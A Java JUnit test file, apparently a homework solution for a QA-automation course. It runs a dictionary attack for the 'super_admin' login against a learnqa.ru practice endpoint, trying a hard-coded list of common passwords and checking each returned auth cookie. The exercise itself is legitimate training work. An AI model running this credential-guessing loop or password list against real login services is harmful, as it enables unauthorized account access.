import io.restassured.RestAssured;
import io.restassured.http.Cookie;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.*;

public class FindPassword {
    @Test
    public void findPassword() {
        Map<String, String> params = new HashMap<>();
        params.put("login", "super_admin");
        ArrayList<String> passwordList = new ArrayList<>();
        Collections.addAll(passwordList, "password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "football",
                "1234567", "monkey", "111111", "letmein", "1234","1234567890", "dragon", "baseball", "sunshine", "iloveyou", "trustno1",
                "princess", "adobe123", "123123", "welcome", "login", "admin", "trustno1", "solo", "1q2w3e4r", "master", "666666", "photoshop",
                "1qaz2wsx", "qwertyuiop", "ashley", "mustang", "121212", "starwars", "654321", "bailey", "access", "flower", "555555",
                "passw0rd", "shadow", "lovely", "ashley", "654321", "7777777", "michael", "!@#$%^&*", "jesus", "password1", "superman",
                "hello", "charlie", "888888", "696969", "qwertyuiop", "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty", "loveme",
                "whatever", "donald", "trustno1", "batman", "zaq1zaq1", "qazwsx", "Football", "000000", "qwerty123" );
        String cookie = "";
        int check = 0;
        String correctPassword = "";
        for (int i = 0; i < passwordList.size(); i++) {
            params.put("password", passwordList.get(i));
            System.out.println("Trying password: " + passwordList.get(i));
            Response response = RestAssured
                    .given()
                    .queryParams(params)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            if (response.getStatusCode() == 500) {
                System.out.println("Attempt # " + i + ": login has an incorrect value");
            } else {
                cookie = response.getCookie("auth_cookie");
            }
            ;
            if (cookie.equals("")) {
                System.out.println("Attempt # " + i + ": please check cookie - they wasn't set!");
            } else {
                Map<String, String> setCookie = new HashMap<>();
                setCookie.put("auth_cookie", cookie);
                Response secondResponse = RestAssured
                        .given()
                        .cookies(setCookie)
                        .when()
                        .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                        .andReturn();
                System.out.println("Attempt # " + i + ". Response is equal to: " + secondResponse.getBody().asString());
                if (secondResponse.getBody().asString().equals("You are authorized")) {
                    correctPassword = passwordList.get(i);
                    System.out.println("====================================================================");
                    System.out.println("Attempt # " + i + ". The suitable password is:  " + correctPassword);
                    break;
                }
                ;
                check = i;
            };
        };
        if (check == passwordList.size()-1 && correctPassword.equals("")){
            System.out.println("====================================================================");
            System.out.println("The password list does not have suitable for authorization  password");
        }
    };
};


